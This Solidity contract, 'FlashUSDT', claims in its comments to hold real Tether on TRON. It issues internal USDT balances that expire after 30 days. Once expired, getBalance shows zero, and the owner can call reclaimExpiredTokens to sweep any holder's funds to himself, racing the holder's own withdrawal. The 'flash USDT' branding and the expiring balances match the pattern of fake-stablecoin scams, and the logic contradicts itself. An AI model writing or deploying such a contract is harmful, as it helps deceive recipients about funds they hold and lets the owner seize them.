// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract FlashUSDT {
    // ✅ USDT TRON MAINNET - Vrai USDT Tether
    // Adresse TronLink: TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t
    IERC20 public usdt = IERC20(0xA614F803B6FD780986A42C78EC9C7F77E6DED13C);

    address public owner;
    uint256 public constant LOCK_PERIOD = 30 days;
    uint256 public constant INITIAL_SUPPLY = 500_000 * 10**6; // 500K USDT

    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public receivedTime;

    event Deposit(address indexed user, uint256 amount);
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    event TokensReclaimed(address indexed user, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    function initialize() external {
        require(msg.sender == owner, "Only owner");
        require(balanceOf[owner] == 0, "Already initialized");

        require(
            usdt.transferFrom(owner, address(this), INITIAL_SUPPLY),
            "Transfer failed - approve USDT first!"
        );

        balanceOf[owner] = INITIAL_SUPPLY;
        receivedTime[owner] = block.timestamp;

        emit Deposit(owner, INITIAL_SUPPLY);
    }

    function isExpired(address holder) public view returns (bool) {
        if (balanceOf[holder] == 0) return false;
        return (block.timestamp - receivedTime[holder]) >= LOCK_PERIOD;
    }

    function getDaysRemaining(address holder) public view returns (uint256) {
        if (isExpired(holder)) return 0;
        uint256 timeLeft = LOCK_PERIOD - (block.timestamp - receivedTime[holder]);
        return timeLeft / 1 days;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(to != address(0), "Invalid address");
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        require(!isExpired(msg.sender), "Your tokens have expired");

        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        if (receivedTime[to] == 0) {
            receivedTime[to] = block.timestamp;
        }
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function withdrawExpiredTokens() external {
        require(isExpired(msg.sender), "Tokens not expired");
        require(balanceOf[msg.sender] > 0, "No tokens");
        uint256 amount = balanceOf[msg.sender];
        balanceOf[msg.sender] = 0;
        require(usdt.transfer(msg.sender, amount), "Withdrawal failed");
        emit Withdrawal(msg.sender, amount);
    }

    function reclaimExpiredTokens(address holder) external {
        require(msg.sender == owner, "Only owner");
        require(isExpired(holder), "Not expired");
        require(balanceOf[holder] > 0, "No tokens");
        uint256 amount = balanceOf[holder];
        balanceOf[holder] = 0;
        require(usdt.transfer(owner, amount), "Reclaim failed");
        emit TokensReclaimed(holder, amount);
    }

    function getBalance(address user) public view returns (uint256) {
        if (isExpired(user)) return 0;
        return balanceOf[user];
    }
}
